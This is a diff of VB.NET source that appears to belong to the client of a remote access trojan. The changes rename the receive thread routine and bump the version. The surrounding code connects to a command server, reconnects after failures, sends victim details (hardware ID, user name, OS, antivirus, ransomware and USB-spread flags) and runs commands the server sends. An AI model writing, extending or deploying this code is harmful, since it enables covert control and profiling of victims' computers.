@@ -6,11 +6,7 @@ Public Class TCP
     Public Shared SPL As String = "|'L'|"
     Public Shared C As Net.Sockets.TcpClient
     Public Shared R As New Random
-
-    Public Shared Sub CON()
-        Dim t As New Threading.Thread(AddressOf REC)
-        t.Start()
-    End Sub
+    Public Shared T1 As New Threading.Thread(AddressOf RECON)
 
     Public Shared Sub Send(ByVal b As Byte())
         If CNT = False Then Exit Sub
@@ -28,7 +24,7 @@ Public Class TCP
         Send(SB(S))
     End Sub
     Public Shared CNT As Boolean = False
-    Public Shared Sub REC()
+    Public Shared Sub RECON()
         Dim MS As New IO.MemoryStream ' create memory stream
         Dim KA As Integer = 0
 re:
@@ -48,7 +44,7 @@ re:
                 MS.Write(B, 0, B.Length)
 rr:
                 If BS(MS.ToArray).Contains(KEY) Then ' split packet..
-                    Dim A As Array = fx(MS.ToArray, KEY)
+                    Dim A As Array = SplitWord(MS.ToArray, KEY)
                     Dim T As New Threading.Thread(AddressOf Commands.Data)
                     T.Start(A(0))
                     MS.Dispose()
@@ -97,7 +93,7 @@ e:      ' clear things and ReConnect
             C.Client.Connect(Settings.HOST, Settings.PORT)
             CNT = True
             'Send info to server
-            Send("info" & SPL & ID.HWID & SPL & ID.UserName & SPL & IO.Path.GetFileName(Application.ExecutablePath) & SPL & "v0.5.5" & SPL & ID.MyOS & " " & ID.Bit & SPL & ID.INDATE & SPL & ID.AV & SPL & ID.Ransomeware & SPL & ID.USBSP & SPL & " ")
+            Send("info" & SPL & ID.HWID & SPL & ID.UserName & SPL & IO.Path.GetFileName(Application.ExecutablePath) & SPL & "v0.5.6" & SPL & ID.MyOS & " " & ID.Bit & SPL & ID.INDATE & SPL & ID.AV & SPL & ID.Ransomeware & SPL & ID.USBSP & SPL & " ")
         Catch ex As Exception
             Threading.Thread.CurrentThread.Sleep(R.Next(5000))
             GoTo e
